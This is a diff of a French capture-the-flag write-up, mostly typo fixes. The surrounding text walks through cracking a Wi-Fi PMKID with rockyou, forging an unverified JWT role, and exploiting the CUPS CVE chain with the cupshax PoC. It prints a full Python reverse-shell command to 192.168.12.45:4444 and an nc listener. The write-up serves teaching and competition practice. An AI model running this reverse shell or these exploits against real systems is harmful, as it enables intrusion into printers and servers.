@@ -11,7 +11,7 @@ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probe
  (not associated)   A4:97:B1:15:8E:F5  -73    0 - 6     20        4         captaincups-wifi 
 ```
 
-Ensuite on nous donne également une capture wireshark avec un seul message eapol (pas le handshake complet habituel à cracker avec aircrack-ng). Néanmoins on retrouve dans le packet les infos dont on a besoin pour crack la pre shared key : 
+On nous donne également une capture wireshark avec un seul message eapol (pas le handshake complet habituel à cracker avec aircrack-ng). Néanmoins on retrouve dans le packet les infos dont on a besoin pour crack la pre-shared key : 
 
 - La PMKID
 - Le SSID
@@ -38,7 +38,7 @@ e7a8005bd36ba5a9e5e0bcbd4211c51f
 d4db1b5a9b2a146c85fe90dcf2a5a40a
 ea0011573095ede0f167d47eaab4e9e3
 7c8129ea1cb3e0f1ea7d431d4745bf0a
-... rock you go brrrrrrrrrrrrrr
+... rockyou goes brrrrrrrrrrrrrr
 0916d4be2a126c895d7a601fc41e1b4b
 be2dd1e083afce2435e02fb6930e0b8c
 0f0991dc41d0a911ec081e6094484ff9
@@ -71,7 +71,8 @@ Dans robots.txt on trouve les informations suivantes
 
 -------------------------------------------------------
 
-Ensuite on se connecte avec le user donné via les commentaires html et on a un JWT mais la signature n'est pas vérifiée, on peut juste le modifier en changeant "user" en "supercaptain" avec jwt.io notamment : 
+Puis on se connecte avec le user donné via les commentaires html et on a un JWT mais la signature n'est pas vérifiée.
+On peut juste le modifier en changeant "user" en "supercaptain" avec jwt.io notamment : 
 
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoic3VwZXJjYXB0YWluIiwiZXhwIjoxNzMyMzI0NzU3fQ.imLNhfONY95-Jev-yQaG8FlCoQo1LtbbRYjSZF-qWfU
@@ -85,9 +86,9 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoic3VwZXJ
 }
 ```
 
-On peut maintenant refresh là page et on arrive sur ça : 
+On refresh la page et on arrive sur ça : 
 
-![Page admin impression](/HACKVENStest_impression.png)
+![Page admin impression](/HACKVENS/test_impression.png)
 
 En entrant une adresse IP, le serveur déclenche une impression vers cette dernière. Grâce au nom de la capture réseau (cups.pcap), nous comprenons qu'il faut exploiter la / les récentes CVEs sur cups.
 En faisant quelques recherches on tombe sur le répo suivant avec un poc et une explication des CVEs : https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain
@@ -98,7 +99,7 @@ En faisant quelques recherches on tombe sur le répo suivant avec un poc et une 
 - **CVE-2024-47177**: Command injection via `foomatic-rip`, allowing attackers to execute arbitrary commands on the system.
 
 La première CVE (47176) est inutile dans notre cas, car nous avons directement un moyen de trigger une impression depuis la web view. Les autres néanmoins sont utiles et permettent d'obtenir une RCE. 
-Nous tentons d'utiliser le POC de ce même répo mais sans succès : le port 631 de la machine cible étant fermée le printer discovery ne peut pas s'effectuer correctement. Nous trouvons un autre [PoC](https://github.com/RickdeJager/cupshax) qui lui implémente différement les CVEs : `This PoC uses dns-sd printer discovery, so the target must be able to receive the broadcast message, i.e. be on the same network. `
+Nous tentons d'utiliser le POC de ce même répo mais sans succès : le port 631 de la machine cible étant fermé le printer discovery ne peut pas s'effectuer correctement. Nous trouvons un autre [PoC](https://github.com/RickdeJager/cupshax) qui lui implémente différement les CVEs : `This PoC uses dns-sd printer discovery, so the target must be able to receive the broadcast message, i.e. be on the same network. `
 
 ```
 └──╼ #python3 cupshax.py --ip 0.0.0.0 --command "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"192.168.12.45\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'" --port 8631
@@ -113,7 +114,7 @@ Ensuite on lance un `nc -lnvp 4444` et on trigger une impression depuis la webvi
 On chope notre shell et un flag.txt : 
 ![Fake flag](/HACKVENS/images/false_espoir.png)
 
-La solve "légit" était de relancer une impression avec un wireshark qui tourne sur notre laptopt et on extrait le pdf depuis la capture dans le IPP response : 
+La solve "légit" était de relancer une impression avec un wireshark qui tourne sur notre laptop et on extrait le pdf depuis la capture dans le IPP response : 
 ![IPP response](/HACKVENS/images/IPP_response.png)
 l
 Dans notre cas nous avons simplement `base64 doc/thomas-ruyant-pos.pdf` ctrl + shift + c
